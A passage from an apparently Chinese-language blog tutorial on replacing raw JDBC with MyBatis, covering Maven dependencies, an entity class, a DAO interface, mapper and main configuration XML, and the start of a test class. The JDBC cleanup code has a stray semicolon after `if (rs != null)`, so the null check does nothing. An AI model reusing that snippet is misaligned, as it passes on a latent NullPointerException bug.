&#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//关闭资源 </span></span><br><span class="line">            <span class="keyword">if</span> (rs != <span class="literal">null</span>) ;</span><br><span class="line">            &#123;</span><br><span class="line">                rs.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (stmt != <span class="literal">null</span>) &#123;</span><br><span class="line">                stmt.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (conn != <span class="literal">null</span>) &#123;</span><br><span class="line">                conn.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用JDBC的缺点"><a href="#使用JDBC的缺点" class="headerlink" title="使用JDBC的缺点"></a>使用JDBC的缺点</h2><ol><li>代码比较多，开发效率低</li><li>需要关注 Connection ,Statement, ResultSet对象创建和销毁</li><li>对 ResultSet查询的结果，需要自己封装为 List</li><li>重复的代码比较多</li><li>业务代码和数据库的操作混在一起</li></ol><h1 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h1><h2 id="Mybatis功能"><a href="#Mybatis功能" class="headerlink" title="Mybatis功能"></a>Mybatis功能</h2><ol><li>注册数据库的驱动、创建Connection ,Statement, ResultSet </li><li>从xml文件中获取sql，并执行sql语句</li><li>把sql的结果转为java对象，List集合</li><li>自动关闭Connection, Statement, ResultSet</li></ol><p>总结：<br>  mybatis是一个sql映射框架，提供的数据库的操作能力。增强的JDBC,使用mybatis让开发人员集中精神写sql就可以了，不必关心Connection,Statement,ResultSet的创建，销毁，sql的执行。 </p><h2 id="创建一个Mybatis项目"><a href="#创建一个Mybatis项目" class="headerlink" title="创建一个Mybatis项目"></a>创建一个Mybatis项目</h2><h3 id="整个项目结构"><a href="#整个项目结构" class="headerlink" title="整个项目结构"></a>整个项目结构</h3><p><img src="/upload/2022/03/image-86eaee114d194243bbade65dd2ca1aa3.png" alt="image.png"><br>上图中MyApp文件是测试文件，不需要加上</p><p><strong>实现步骤：</strong><br>1、配置pom.xml文件，加入mybatis所需依赖和插件<br>2、创建实体类（Student）<br>3、创建持久层的dao接口，定义操作数据库的方法<br>4、创建mybatis使用的配置文件，叫做sql映射文件，写sql语句，一般一个表一个sql映射文件，这个文件是xml文件。<br>5、创建mybatis的主配置文件，一个项目就一个主配置文件，主配置文件提供了数据库的连接信息和sql映射文件的位置信息<br>6、创建使用mybatis类，通过mybatis访问数据库</p><h3 id="配置maven文件"><a href="#配置maven文件" class="headerlink" title="配置maven文件"></a>配置maven文件</h3><p>在pom.xml文件中加入Mybatis相关依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--mybatis依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--mysql驱动--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"> <span class="comment">&lt;!--maven插件 用于指定文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span><span class="comment">&lt;!--所在的目录--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">includes</span>&gt;</span><span class="comment">&lt;!--包括目录下的.properties,.xml 文件都会扫描到--&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>false<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="编写实体类"><a href="#编写实体类" class="headerlink" title="编写实体类"></a>编写实体类</h3><p>在domain包下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="comment">//定义属性， 目前要求是属性名和列名一样。</span></span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getId</span><span class="params">()</span> &#123; <span class="keyword">return</span> id;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(Integer id)</span> &#123; <span class="built_in">this</span>.id = id;&#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123; <span class="built_in">this</span>.name = name;&#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEmail</span><span class="params">()</span> &#123; <span class="keyword">return</span> email; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEmail</span><span class="params">(String email)</span> &#123; <span class="built_in">this</span>.email = email;&#125;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123; <span class="keyword">return</span> age; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123; <span class="built_in">this</span>.age = age;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, email=&#x27;&quot;</span> + email + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="编写DAO接口"><a href="#编写DAO接口" class="headerlink" title="编写DAO接口"></a>编写DAO接口</h3><p>在dao包下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//接口操作student表</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">StudentDao</span> &#123;</span><br><span class="line">    <span class="comment">//查询student表的所有的数据</span></span><br><span class="line">    List&lt;Student&gt; <span class="title function_">selectStudents</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//插入方法</span></span><br><span class="line">    <span class="comment">//参数： student ,表示要插入到数据库的数据</span></span><br><span class="line">    <span class="comment">//返回值： int ， 表示执行insert操作后的 影响数据库的行数</span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">insertStudent</span><span class="params">(Student student)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">updateStudent</span><span class="params">(Student student)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">deleteStudent</span><span class="params">(<span class="type">int</span> id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="编写DAO接口Mapper映射文件"><a href="#编写DAO接口Mapper映射文件" class="headerlink" title="编写DAO接口Mapper映射文件"></a>编写DAO接口Mapper映射文件</h3><p>在dao包下，且和上面的DAO接口名称一样，为xml文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.hukaichao.dao.StudentDao&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">       select:表示查询操作。</span></span><br><span class="line"><span class="comment">       id: 你要执行的sql语法的唯一标识， mybatis会使用这个id的值来找到要执行的sql语句</span></span><br><span class="line"><span class="comment">           可以自定义，但是最好使用接口中的方法名称。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       resultType:表示结果类型的， 是sql语句执行后得到ResultSet,遍历这个ResultSet得到java对象的类型。</span></span><br><span class="line"><span class="comment">          值写的类型的全限定名称</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectStudents&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.hukaichao.domain.Student&quot;</span> &gt;</span></span><br><span class="line">        select id,name,email,age from student order by id</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--插入操作--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;insertStudent&quot;</span>&gt;</span></span><br><span class="line">        insert into student values(#&#123;id&#125;,#&#123;name&#125;,#&#123;email&#125;,#&#123;age&#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">&quot;deleteStudent&quot;</span>&gt;</span> </span><br><span class="line">delete from student where id=#&#123;id&#125; </span><br><span class="line">    <span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;updateStudent&quot;</span>&gt;</span> </span><br><span class="line">update student set age = #&#123;age&#125; where id=#&#123;id&#125; </span><br><span class="line">    <span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  sql映射文件（sql mapper）： 写sql语句的， mybatis会执行这些sql</span></span><br><span class="line"><span class="comment">  1.指定约束文件</span></span><br><span class="line"><span class="comment">     &lt;!DOCTYPE mapper</span></span><br><span class="line"><span class="comment">        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="line"><span class="comment">        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;</span></span><br><span class="line"><span class="comment">    mybatis-3-mapper.dtd是约束文件的名称， 扩展名是dtd的。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  2.约束文件作用：  限制，检查在当前文件中出现的标签，属性必须符合mybatis的要求。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  3.mapper 是当前文件的根标签，必须的。</span></span><br><span class="line"><span class="comment">    namespace：叫做命名空间，唯一值的， 可以是自定义的字符串。</span></span><br><span class="line"><span class="comment">               最好使用dao接口的全限定名称。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  4.在当前文件中，可以使用特定的标签，表示数据库的特定操作。</span></span><br><span class="line"><span class="comment">   &lt;select&gt;:表示执行查询，select语句</span></span><br><span class="line"><span class="comment">   &lt;update&gt;:表示更新数据库的操作， 就是在&lt;update&gt;标签中 写的是update sql语句</span></span><br><span class="line"><span class="comment">   &lt;insert&gt;:表示插入， 放的是insert语句</span></span><br><span class="line"><span class="comment">   &lt;delete&gt;:表示删除， 执行的delete语句</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h3 id="配置Mybatis主配置文件"><a href="#配置Mybatis主配置文件" class="headerlink" title="配置Mybatis主配置文件"></a>配置Mybatis主配置文件</h3><p>项目src&#x2F;main 下创建 resources目录，设置 resources目录为resources root<br>在resources目录下创建主配置文件：名称为 mybatis.xml<br>说明：主配置文件名称是自定义的，内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">configuration</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--settings：控制mybatis全局行为--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--设置mybatis输出日志--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;logImpl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;STDOUT_LOGGING&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--环境配置： 数据库的连接信息</span></span><br><span class="line"><span class="comment">        default:必须和某个environment的id值一样。</span></span><br><span class="line"><span class="comment">        告诉mybatis使用哪个数据库的连接信息。也就是访问哪个数据库</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;mydev&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- environment : 一个数据库信息的配置， 环境</span></span><br><span class="line"><span class="comment">             id:一个唯一值，自定义，表示环境的名称。</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;mydev&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">               transactionManager ：mybatis的事务类型</span></span><br><span class="line"><span class="comment">                   type: JDBC(表示使用jdbc中的Connection对象的commit，rollback做事务处理)</span></span><br><span class="line"><span class="comment">            --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">               dataSource:表示数据源，连接数据库的</span></span><br><span class="line"><span class="comment">                  type：表示数据源的类型， POOLED表示使用连接池</span></span><br><span class="line"><span class="comment">            --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">                   driver, user, username, password 是固定的，不能自定义。</span></span><br><span class="line"><span class="comment">                --&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--数据库的驱动类名--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--连接数据库的url字符串--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/student&quot;</span>/&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--访问数据库的用户名--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--密码--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--表示线上的数据库，是项目真实使用的库--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;online&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/student&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- sql mapper(sql映射文件)的位置--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--一个mapper标签指定一个文件的位置。</span></span><br><span class="line"><span class="comment">           从类路径开始的路径信息。  target/clasess(类路径)</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;com/hukaichao/dao/StudentDao.xml&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;mapper resource=&quot;com/hukaichao/dao/SchoolDao.xml&quot; /&gt;--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">   mybatis的主配置文件： 主要定义了数据库的配置信息， sql映射文件的位置</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   1. 约束文件</span></span><br><span class="line"><span class="comment">   &lt;!DOCTYPE configuration</span></span><br><span class="line"><span class="comment">        PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span><br><span class="line"><span class="comment">        &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;</span></span><br><span class="line"><span class="comment">    mybatis-3-config.dtd：约束文件的名称</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  2. configuration 根标签。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h3 id="创建测试类"><a href="#创建测试类" class="headerlink" title="创建测试类"></a>创建测试类</h3><p>在src&#x2F;test&#x2F;java&#x2F;com&#x2F;hukaichao&#x2F; 创建 MyBatisTest.java文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestMyBatis</span> &#123;</span><br><span class="line">    <span class="comment">//测试方法，测试功能</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testInsert</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//访问mybatis读取student数据</span></span><br><span class="line">        <span class="comment">//1.定义mybatis主配置文件的名称, 从类路径的根开始（target/clasess）</span></span><br><span class="line">        String config=<span class="string">&quot;mybatis.xml&quot;</span>;</span><br><span class="line">        <span class="comment">//2.读取这个config表示的文件</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Resources.getResourceAsStream(config);</span><br><span class="line">        